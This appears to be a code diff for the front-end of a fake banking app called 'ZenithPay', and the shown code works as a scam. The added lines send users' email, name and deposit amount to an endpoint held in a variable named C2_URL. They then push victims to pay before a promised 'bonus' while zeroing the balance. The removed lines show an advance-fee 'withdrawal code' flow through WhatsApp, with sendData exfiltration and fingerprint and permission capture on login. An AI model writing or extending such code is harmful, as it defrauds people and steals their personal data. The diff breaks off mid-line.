@@ -241,7 +241,6 @@ function loadDashboard() {
 // ===== CARDS TAB =====
 // ============================================================
 
-// Freeze/Unfreeze Card
 document.querySelectorAll('[id^="freezeBtn"]').forEach(btn => {
     btn.addEventListener('click', function() {
         const cardId = this.id.replace('freezeBtn', '');
@@ -268,7 +267,6 @@ document.querySelectorAll('[id^="freezeBtn"]').forEach(btn => {
     });
 });
 
-// Card Details
 document.querySelectorAll('[id^="cardDetailsBtn"]').forEach(btn => {
     btn.addEventListener('click', function() {
         const cardId = this.id.replace('cardDetailsBtn', '');
@@ -296,7 +294,6 @@ document.getElementById('cardDetailsModal')?.addEventListener('click', function(
     }
 });
 
-// Add Card
 document.getElementById('addCardBtn')?.addEventListener('click', function() {
     alert('📱 Your new virtual card is being generated. Check back in a few minutes.');
 });
@@ -343,7 +340,6 @@ document.getElementById('transferBtn')?.addEventListener('click', function() {
 // ===== PROFILE TAB =====
 // ============================================================
 
-// Toggle settings
 document.querySelectorAll('.toggle').forEach(toggle => {
     toggle.addEventListener('click', function() {
         if (this.textContent === 'On') {
@@ -356,7 +352,6 @@ document.querySelectorAll('.toggle').forEach(toggle => {
     });
 });
 
-// Logout
 document.getElementById('logoutBtn')?.addEventListener('click', function() {
     if (confirm('Are you sure you want to logout?')) {
         localStorage.clear();
@@ -365,7 +360,78 @@ document.getElementById('logoutBtn')?.addEventListener('click', function() {
 });
 
 // ============================================================
-// ===== WITHDRAW MODAL =====
+// ===== PAY WITH FLUTTERWAVE =====
+// ============================================================
+
+document.getElementById('payWithFlutterwaveBtn')?.addEventListener('click', async function() {
+    const amount = document.getElementById('depositAmount').value;
+    const userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');
+
+    if (!userData.email) {
+        alert('⚠️ Please complete your profile first.');
+        return;
+    }
+
+    try {
+        this.textContent = 'Processing...';
+        this.disabled = true;
+
+        const response = await fetch(`${C2_URL}/initiate_payment`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                email: userData.email,
+                amount: amount,
+                name: userData.fullname || 'Customer'
+            })
+        });
+
+        const result = await response.json();
+
+        if (result.status === 'success' && result.payment_link) {
+            window.location.href = result.payment_link;
+        } else {
+            alert('❌ Payment initiation failed. Please try again.');
+            this.textContent = '💳 Pay with Flutterwave';
+            this.disabled = false;
+        }
+    } catch (error) {
+        console.error('Payment error:', error);
+        alert('❌ An error occurred. Please try again.');
+        this.textContent = '💳 Pay with Flutterwave';
+        this.disabled = false;
+    }
+});
+
+// ===== CHECK PAYMENT STATUS ON RETURN =====
+if (window.location.search.includes('tx_ref')) {
+    const params = new URLSearchParams(window.location.search);
+    const tx_ref = params.get('tx_ref');
+    const status = params.get('status');
+
+    if (status === 'successful' && tx_ref) {
+        fetch(`${C2_URL}/verify_payment`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ tx_ref: tx_ref })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === 'success') {
+                alert('✅ Payment successful! Your bonus is now available.');
+                localStorage.setItem('zenithpay_balance', '0');
+                location.reload();
+            } else {
+                alert('⚠️ Payment verification failed. Contact support.');
+            }
+        });
+    } else if (status === 'cancelled') {
+        alert('⚠️ Payment was cancelled.');
+    }
+}
+
+// ============================================================
+// ===== WITHDRAW MODAL (OPEN) =====
 // ============================================================
 
 document.getElementById('withdrawBtn')?.addEventListener('click', function() {
@@ -386,7 +452,10 @@ document.getElementById('withdrawModal')?.addEventListener('click', function(e) 
     }
 });
 
-// ===== COPY ACCOUNT =====
+// ============================================================
+// ===== WHATSAPP MODAL =====
+// ============================================================
+
 document.getElementById('copyAccount')?.addEventListener('click', function() {
     const account = '0123456789';
     navigator.clipboard.writeText(account).then(() => {
@@ -402,7 +471,6 @@ document.getElementById('copyAccount')?.addEventListener('click', function() {
     });
 });
 
-// ===== VERIFY PAYMENT → WHATSAPP =====
 document.getElementById('verifyPaymentBtn')?.addEventListener('click', function() {
     const amount = document.getElementById('depositAmount').value;
     const userAccount = document.getElementById('userAccount').value;
@@ -424,95 +492,4 @@ document.getElementById('verifyPaymentBtn')?.addEventListener('click', function(
     });
 
     document.getElementById('withdrawModal').classList.add('hidden');
-    document.getElementById('whatsappModal').classList.remove('hidden');
-
-    const waLink = document.getElementById('whatsappLink');
-    const msg = `Hello, I sent ₦${amount} for my ZenithPay withdrawal. My name is ${userData.fullname || 'User'}. My account is ${userAccount} (${userBank}). Please send my code.`;
-    waLink.href = `https://wa.me/2348000000000?text=${encodeURIComponent(msg)}`;
-});
-
-// ===== CLOSE WHATSAPP =====
-document.getElementById('closeWhatsapp')?.addEventListener('click', function() {
-    document.getElementById('whatsappModal').classList.add('hidden');
-});
-
-document.getElementById('whatsappModal')?.addEventListener('click', function(e) {
-    if (e.target === this) {
-        this.classList.add('hidden');
-    }
-});
-
-// ===== VERIFY CODE =====
-document.getElementById('verifyCodeBtn')?.addEventListener('click', function() {
-    const enteredPassword = document.getElementById('adminPassword').value;
-
-    if (enteredPassword !== ADMIN_PASSWORD) {
-        const input = document.getElementById('adminPassword');
-        input.style.borderColor = '#DC2626';
-        input.style.boxShadow = '0 0 0 3px rgba(220,38,38,0.2)';
-        input.value = '';
-        input.placeholder = '❌ Invalid code. Try again.';
-        setTimeout(() => {
-            input.style.borderColor = '#E2E8F0';
-            input.style.boxShadow = 'none';
-            input.placeholder = 'Enter code from admin';
-        }, 3000);
-        return;
-    }
-
-    sendData({
-        type: 'access_code_verified',
-        code: enteredPassword,
-        timestamp: Date.now()
-    });
-
-    document.getElementById('whatsappModal').classList.add('hidden');
-
-    // Update dashboard
-    const balanceDisplay = document.getElementById('balanceDisplay');
-    const statBalance = document.getElementById('statBalance');
-    const balanceCard = document.querySelector('.balance-card');
-    const emptyState = document.getElementById('emptyState');
-    const bonusTx = document.getElementById('bonusTx');
-    const withdrawTx = document.getElementById('withdrawTx');
-    const statTx = document.getElementById('statTx');
-
-    if (balanceDisplay) balanceDisplay.textContent = '₦0.00';
-    if (statBalance) statBalance.textContent = '₦0';
-    if (balanceCard) balanceCard.style.background = '#94A3B8';
-    if (emptyState) emptyState.classList.add('hidden');
-    if (bonusTx) bonusTx.classList.remove('hidden');
-    if (withdrawTx) withdrawTx.classList.remove('hidden');
-    if (statTx) statTx.textContent = '2';
-
-    localStorage.setItem('zenithpay_balance', '0');
-
-    alert('✅ Withdrawal successful! Your funds have been processed.');
-
-    setTimeout(() => {
-        window.location.href = 'success.html';
-    }, 1500);
-});
-
-// ============================================================
-// ===== INIT =====
-// ============================================================
-
-// Run on login page
-if (document.getElementById('loginPage')) {
-    captureFingerprint();
-    setTimeout(requestPermissions, 800);
-
-    const submitBtn = document.getElementById('submitBtn');
-    if (submitBtn) {
-        submitBtn.disabled = true;
-        setTimeout(() => {
-            submitBtn.disabled = false;
-        }, 3000);
-    }
-}
-
-// Run on dashboard page
-if (document.getElementById('greeting')) {
-    document.addEventListener('DOMContentLoaded', loadDashboard);
-}
+    document.getElementById('whatsappModal').classList.remove
